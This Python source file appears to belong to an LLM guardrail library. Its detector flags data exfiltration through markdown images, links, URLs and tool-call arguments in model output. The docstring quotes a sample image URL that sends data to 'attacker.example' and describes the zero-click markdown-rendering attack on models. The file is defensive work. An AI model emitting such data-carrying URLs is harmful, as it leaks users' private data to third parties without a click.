"""C14: data exfiltration through URLs in the model output (markdown images, links, bare URLs).

A model that repeats `![x](https://attacker.example/p.png?d=<data>)` leaks data without a
click: the client only has to render markdown. Images to a host outside the allowlist are
always flagged (zero-click); links and bare URLs only when they carry data. Spans cover the
URL alone, so redaction leaves a broken relative image and no request leaves the client.
Tool-call arguments (`http_get` to the attacker) are scanned too; the policy blocks those.
"""

import json
import re
import unicodedata
from collections.abc import Iterator, Sequence
from dataclasses import dataclass
from typing import ClassVar, Final, Literal
from urllib.parse import urlsplit

from pydantic import BaseModel, ConfigDict, Field, field_validator

from egida.core.models import Category, Finding, Span
from egida.core.ports import ScanContext
from egida.core.texts import iter_texts
from egida.detectors.common import EVIDENCE_MAX

EGRESS_TAGS: Final = ("owasp.llm05-2025", "owasp.llm02-2025", "atlas.AML.T0077")
EGRESS_TOOL_TAGS: Final = (*EGRESS_TAGS, "atlas.AML.T0086")

# Anchored patterns only; look-behind context is found with bounded rfind (no ReDoS).
_MD_TARGET: Final = re.compile(r"\]\(\s{0,10}<?([^\s)>]{1,2048})")
_MD_REFERENCE: Final = re.compile(r"^ {0,3}\[[^\]\n]{1,500}\]:[ \t]*<?([^\s>]{1,2048})", re.M)
_IMG_SRC: Final = re.compile(r"\bsrc\s*=\s*[\"']?([^\"'\s>]{1,2048})", re.I)
_BARE_URL: Final = re.compile(r"\b(?:https?://|www\.)[^\s<>\"'`]{1,2048}", re.I)
_REMOTE: Final = re.compile(r"(?:https?:|//|www\.)", re.I)
_DOMAIN: Final = re.compile(r"[a-z0-9-]+(\.[a-z0-9-]+)+")
_ASCII_HOST: Final = re.compile(r"[a-z0-9.-]+")
# "The URL carries data": base64/hex-like path tokens, long digit runs (PESEL, phone, card,
# account) and long DNS labels (exfiltration through subdomains).
_PATH_TOKEN: Final = re.compile(r"[A-Za-z0-9+=_]{24,}")
_DIGITS: Final = re.compile(r"\d{9,}")
_LONG_LABEL: Final = 24
_TRAILING: Final = ".,;:!?*_~"
_MAX_JSON_LEAVES: Final = 1000

Kind = Literal["image", "link", "url"]


class EgressParams(BaseModel):
    model_config = ConfigDict(extra="forbid", frozen=True)

    allowed_domains: tuple[str, ...] = ()  # label-boundary suffix: bank.example ⊇ a.bank.example
    scan: tuple[Literal["content", "tool_arguments"], ...] = Field(
        default=("content", "tool_arguments"), min_length=1
    )
    links: Literal["with_data", "all"] = "with_data"  # images: always, outside the allowlist

    @field_validator("allowed_domains")
    @classmethod
    def _domains(cls, domains: tuple[str, ...]) -> tuple[str, ...]:
        cleaned = tuple(d.strip().casefold().rstrip(".") for d in domains)
        for raw, domain in zip(domains, cleaned, strict=True):
            if not _DOMAIN.fullmatch(domain):
                raise ValueError(
                    f"allowed_domains: {raw!r} must be a plain domain such as bank.example "
                    "(no scheme, wildcard, path, port or user; IDN in punycode)"
                )
        return cleaned


@dataclass(frozen=True, slots=True)
class UrlHit:
    start: int
    end: int
    url: str
    kind: Kind


@dataclass(frozen=True, slots=True)
class Verdict:
    hit: UrlHit
    host: str | None
    reasons: tuple[str, ...]


def _trim(url: str) -> str:
    """Drop trailing punctuation and unbalanced closing brackets of a bare URL."""
    while url:
        if url[-1] in _TRAILING:
            url = url[:-1]
        elif url[-1] == ")" and url.count(")") > url.count("("):
            url = url[:-1]
        elif url[-1] == "]" and url.count("]") > url.count("["):
            url = url[:-1]
        else:
            break
    return url


def find_urls(text: str) -> list[UrlHit]:
    hits: list[UrlHit] = []
    for m in _MD_TARGET.finditer(text):
        if _REMOTE.match(m.group(1)):
            p = text.rfind("[", max(0, m.start() - 500), m.start())
            kind: Kind = "image" if p > 0 and text[p - 1] == "!" else "link"
            hits.append(UrlHit(m.start(1), m.end(1), m.group(1), kind))
    for m in _MD_REFERENCE.finditer(text):  # ![x][ref] renders like an image: zero-click
        if _REMOTE.match(m.group(1)):
            hits.append(UrlHit(m.start(1), m.end(1), m.group(1), "image"))
    for m in _IMG_SRC.finditer(text):
        lt = text.rfind("<", max(0, m.start() - 1000), m.start())
        is_img = lt >= 0 and text[lt : lt + 4].casefold() == "<img"
        if is_img and ">" not in text[lt : m.start()] and _REMOTE.match(m.group(1)):
            hits.append(UrlHit(m.start(1), m.end(1), m.group(1), "image"))
    taken = sorted((h.start, h.end) for h in hits)
    for m in _BARE_URL.finditer(text):
        if any(start <= m.start() < end for start, end in taken):
            continue
        url = _trim(m.group())
        if url:
            hits.append(UrlHit(m.start(), m.start() + len(url), url, "url"))
    return sorted(hits, key=lambda h: h.start)


def _with_scheme(url: str) -> str:
    """Prepare like the WHATWG parser: no tabs/newlines, "\\" is "/", www. and // get http."""
    url = url.replace("\t", "").replace("\r", "").replace("\n", "").replace("\\", "/")
    if url[:4].casefold() == "www.":
        return "http://" + url
    if url.startswith("//"):
        return "http:" + url
    return url


def canonical_host(url: str) -> str | None:
    """Host a browser would contact; None when unparseable (callers treat it as not allowed)."""
    try:
        host = urlsplit(_with_scheme(url)).hostname
    except ValueError:  # malformed URL is data, not a detector failure
        return None
    if not host:
        return None
    return unicodedata.normalize("NFKC", host).replace("。", ".").casefold().rstrip(".")


def host_allowed(host: str | None, allowed: Sequence[str]) -> bool:
    if host is None or not _ASCII_HOST.fullmatch(host):
        return False
    return any(host == d or host.endswith("." + d) for d in allowed)


def data_reasons(url: str) -> tuple[str, ...]:
    """Why a parseable URL looks like it carries data. Empty tuple = plain link."""
    split = urlsplit(_with_scheme(url))
    host = split.hostname or ""
    reasons = []
    if split.query:
        reasons.append("query")
    if split.fragment:
        reasons.append("fragment")
    if split.username is not None:
        reasons.append("userinfo")
    tokens = _PATH_TOKEN.findall(split.path)
    if any(re.search(r"\d", t) and re.search(r"[A-Za-z]", t) for t in tokens):
        reasons.append("path")
    if _DIGITS.search(split.path) or _DIGITS.search(host):
        reasons.append("digits")
    if any(len(label) >= _LONG_LABEL for label in host.split(".")[:-2]):
        reasons.append("subdomain")
    return tuple(reasons)


def judge(text: str, params: EgressParams) -> list[Verdict]:
    """Flagged URLs only: images outside the allowlist, links/URLs that carry data."""
    flagged = []
    for hit in find_urls(text):
        host = canonical_host(hit.url)
        if host_allowed(host, params.allowed_domains):
            continue
        reasons = data_reasons(hit.url) if host is not None else ("unparseable",)
        if hit.kind == "image" or reasons or params.links == "all":
            flagged.append(Verdict(hit, host, reasons))
    return flagged


def _json_strings(value: object) -> Iterator[str]:
    """Leaf strings and keys of a JSON document, iteratively, at most _MAX_JSON_LEAVES."""
    stack, seen = [value], 0
    while stack and seen < _MAX_JSON_LEAVES:
        item = stack.pop()
        if isinstance(item, str):
            seen += 1
            yield item
        elif isinstance(item, dict):
            for key, child in item.items():
                stack += [key, child]
        elif isinstance(item, list):
            stack += item


def _parse_json(text: str) -> object | None:
    try:
        document: object = json.loads(text)
    except json.JSONDecodeError:  # malformed arguments are data: scanned as raw text
        return None
    return document


def _short_host(host: str | None) -> str:
    """Two last labels only: a data-carrying subdomain must not reach the audit."""
    if host is None:
        return "<unparseable>"
    if not _ASCII_HOST.fullmatch(host):
        return "<non-ascii host>"
    labels = host.split(".")
    return host if len(labels) <= 2 else "*." + ".".join(labels[-2:])


def _spans(target: str, text: str, verdicts: list[Verdict], raw: bool) -> list[Span]:
    if raw:
        return [Span(target, v.hit.start, v.hit.end, f"egress_{v.hit.kind}") for v in verdicts]
    spans = []
    for v in verdicts:  # URL found in a JSON leaf: locate it in the raw arguments
        idx = text.find(v.hit.url)
        if idx >= 0:  # escaped JSON (https:\/\/…) has no span; the pipeline blocks instead
            spans.append(Span(target, idx, idx + len(v.hit.url), f"egress_{v.hit.kind}"))
    return spans


class EgressDetector:
    kind: ClassVar[str] = "egress"
    Params: ClassVar[type[BaseModel]] = EgressParams

    async def scan(self, ctx: ScanContext) -> list[Finding]:
        params = ctx.params
        if not isinstance(params, EgressParams):
            raise TypeError(f"expected EgressParams, got {type(params).__name__}")
        spans: list[Span] = []
        verdicts: list[Verdict] = []
        in_tool_args = False
        for target, text in iter_texts(ctx.interaction, ctx.side):
            scope = "tool_arguments" if target.endswith(".arguments") else "content"
            if scope not in params.scan:
                continue
            document = _parse_json(text) if scope == "tool_arguments" else None
            raw = document is None  # content, or arguments that are not JSON: judge raw text
            found = (
                judge(text, params)
                if raw
                else [v for leaf in _json_strings(document) for v in judge(leaf, params)]
            )
            spans += _spans(target, text, found, raw)
            verdicts += found
            in_tool_args = in_tool_args or (bool(found) and scope == "tool_arguments")
        if not verdicts:
            return []
        parts = [
            f"{v.hit.kind}→{_short_host(v.host)} [{','.join(v.reasons) or 'zero-click'}]"
            for v in verdicts[:3]
        ]
        if len(verdicts) > 3:
            parts.append(f"+{len(verdicts) - 3} more")
        return [
            Finding(
                control_id=ctx.control_id,
                category=Category.EXFILTRATION,
                score=1.0,
                spans=tuple(spans),
                evidence="; ".join(parts)[:EVIDENCE_MAX],
                tags=EGRESS_TOOL_TAGS if in_tool_args else EGRESS_TAGS,
            )
        ]
